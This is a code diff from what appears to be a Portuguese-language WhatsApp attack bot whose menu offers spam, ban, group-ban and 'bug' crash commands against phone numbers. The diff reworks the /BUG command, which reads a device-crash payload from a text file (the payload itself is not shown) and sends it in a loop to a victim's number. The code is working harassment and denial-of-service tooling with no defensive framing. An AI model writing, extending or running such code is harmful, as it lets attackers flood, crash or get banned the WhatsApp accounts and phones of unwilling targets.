@@ -154,7 +154,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     `> /SP4M <número> <qtd>\n` +
                     `> /B4N <número> <qtd>\n` +
                     `> /B4NGRUPO <link>\n` +
-                    `> /BUG <IOS> <número> <qtd>\n` +
+                    `> /BUG <número> <qtd>\n` +
                     `> /BUGSP4M <número> <qtd>\n` +
                     `> /SPANBUG <número> <qtd>\n` +
                     `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
@@ -334,34 +334,32 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             }
             else if (texto.startsWith('/BUG ')) {
                 const partes = texto.replace('/BUG', '').trim().split(' ');
-                // Exemplo: /BUG IOS 5511999999999 10
-                const tipoBug = partes[0]?.toUpperCase();
-                const alvoNum = partes[1]?.replace(/\D/g, '');
-                const quantidade = parseInt(partes[2]) || 10;
+                const alvoNum = partes[0]?.replace(/\D/g, '');
+                const quantidade = parseInt(partes[1]) || 10;
 
-                if (tipoBug !== 'IOS' || !alvoNum) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/BUG <IOS> <número> <quantidade>`' });
+                if (!alvoNum) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/BUG <número> <quantidade>`' });
                     return;
                 }
 
                 let conteudoBugIos = "🍎 [ZRX-BUG IOS CRASH] 💥 Payload ativado para travamento de dispositivos Apple.";
-                const caminhoBugIos = path.join(__dirname, 'BugIos.txt');
+                const caminhoBugIos = path.join(__dirname, 'Buglos.txt'); // compatível com o nome criado no github
                 if (fs.existsSync(caminhoBugIos)) {
                     conteudoBugIos = fs.readFileSync(caminhoBugIos, 'utf-8');
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
-                await waSock.sendMessage(remoteJid, { text: `🍎 Iniciando envio de /BUG IOS para ${alvoNum} (${quantidade} ciclos)...` });
+                await waSock.sendMessage(remoteJid, { text: `🍎 Iniciando envio de /BUG para ${alvoNum} (${quantidade} ciclos)...` });
 
                 for (let i = 1; i <= quantidade; i++) {
                     try {
-                        await waSock.sendMessage(jidAlvo, { text: `${conteudoBugIos}\n\n[Ciclo IOS ${i}/${quantidade}]` });
+                        await waSock.sendMessage(jidAlvo, { text: `${conteudoBugIos}\n\n[Ciclo BUG ${i}/${quantidade}]` });
                         await delay(1000);
                     } catch (err) {
-                        console.log(`Erro no ciclo IOS ${i}:`, err.message);
+                        console.log(`Erro no ciclo BUG ${i}:`, err.message);
                     }
                 }
-                await waSock.sendMessage(remoteJid, { text: `✅ Disparo /BUG IOS para ${alvoNum} concluído!` });
+                await waSock.sendMessage(remoteJid, { text: `✅ Disparo /BUG para ${alvoNum} concluído!` });
             }
             else if (texto.startsWith('/BUGSP4M ')) {
                 const partes = texto.replace('/BUGSP4M', '').trim().split(' ');
